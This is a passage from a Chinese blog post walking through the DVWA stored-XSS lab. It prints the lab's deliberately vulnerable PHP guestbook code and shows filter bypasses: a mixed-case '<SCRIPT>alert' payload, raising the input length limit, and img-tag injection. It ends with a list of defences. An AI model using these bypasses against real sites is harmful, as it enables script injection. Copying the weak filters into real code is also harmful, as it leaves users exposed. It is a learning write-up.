+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>addslashes(string) ：函数返回在预定义字符之前添加反斜杠的字符串，预定义字符 ’ 、” 、\ 、NULL</p>
+<p>strip_tags(string) ：函数剥去string字符串中的 HTML、XML 以及 PHP 的标签</p>
+<p>htmlspecialchars(string)： 把预定义的字符 “&lt;” （小于）、 “&gt;” （大于）、&amp; 、‘’、“” 转换为 HTML 实体，防止浏览器将其作为HTML元素</p>
+<p>根据源码可以看出message已经被过滤，所以只能在name下手</p>
+<p>使用大小写绕过str_replace</p>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311221528661.png" srcset="/img/loading.gif" lazyload alt="image-20230311221528661"></p>
+<p>被限制长度最大为10，改为100</p>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311221746474.png" srcset="/img/loading.gif" lazyload alt="image-20230311221746474"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311221854152.png" srcset="/img/loading.gif" lazyload alt="image-20230311221854152"></p>
+<p>high</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>写入xss就可以，过滤了script，使用img等就可以</p>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311224056647.png" srcset="/img/loading.gif" lazyload alt="image-20230311224056647"></p>
+<p>impossible</p>
+<p>只要使用htmlspecialchars(string)将name和massage都转化为实体，过滤就不存在xss漏洞</p>
+<h2 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h2><p>1、在前端js对输入的字符使用htmlspecialchars函数将输入内容html实体化</p>
+<p>2、尽量采用白名单策略，只允许特定字符输入，并在前端过滤掉#字符</p>
+<p>3、采用黑名单过滤特殊字符，如script、&lt;&gt;、&lt;、alert等</p>
+<p>4、将重要的cookie设置为http only，防止黑客通过JavaScript的document.cookie盗取cookie值</p>
+<p>5、过滤javascript的on事件，如onclick、onload、onerror等</p>
+</ImG></script>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>http://example.com/2023/03/11/XSS基础/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>mk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年3月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/03/15/xss-labs/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/" title="sqllibsPOST类型注入">
+                        <span class="hidden-mobile">sqllibsPOST类型注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div>mk的博客 | 记录成长历程</div> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
